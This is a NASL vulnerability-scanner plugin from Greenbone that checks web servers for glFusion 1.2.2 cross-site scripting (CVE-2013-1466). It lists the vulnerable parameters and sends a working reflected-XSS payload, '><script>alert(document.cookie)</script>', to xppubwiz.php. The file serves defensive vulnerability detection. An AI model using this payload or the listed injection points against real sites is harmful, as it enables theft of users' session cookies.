# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803316");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2013-1466");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-03-01 11:22:26 +0530 (Fri, 01 Mar 2013)");
  script_name("glFusion Multiple Cross-Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24536");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58058");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23142");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120423/glFusion-1.2.2-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to execute arbitrary code
  in the browser to steal cookie-based authentication credentials and launch
  other attacks.");

  script_tag(name:"affected", value:"glFusion version 1.2.2 and prior");

  script_tag(name:"insight", value:"The flaws are due

  - Insufficient filtration of user data in URL after
    '/admin/plugins/mediagallery/xppubwiz.php'

  - Insufficient filtration of user data passed to '/profiles.php',
    '/calendar/index.php' and '/links/index.php' via following parameters,
    'subject', 'title', 'url', 'address1', 'address2', 'calendar_type', 'city',
    'state', 'title', 'url', 'zipcode'.");

  script_tag(name:"solution", value:"Upgrade to the latest version of glFusion 1.2.2.pl4 or later.");

  script_tag(name:"summary", value:"glFusion is prone to multiple cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_xref(name:"URL", value:"http://www.glfusion.org/filemgmt/index.php");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

foreach dir (make_list_unique("/", "/glfusion", "/fusion", "/cms", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir,"/index.php"),  port:port);

  if('>glFusion' >< res)
  {
    url = dir + '/admin/plugins/mediagallery/xppubwiz.php/'+
                '><script>alert(document.cookie)</script>';

    if(http_vuln_check(port: port, url: url, check_header: TRUE,
       pattern: "<script>alert\(document\.cookie\)</script>",
       extra_check: make_list("User Name","Password")))
    {
      report = http_report_vuln_url( port:port, url:url );
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
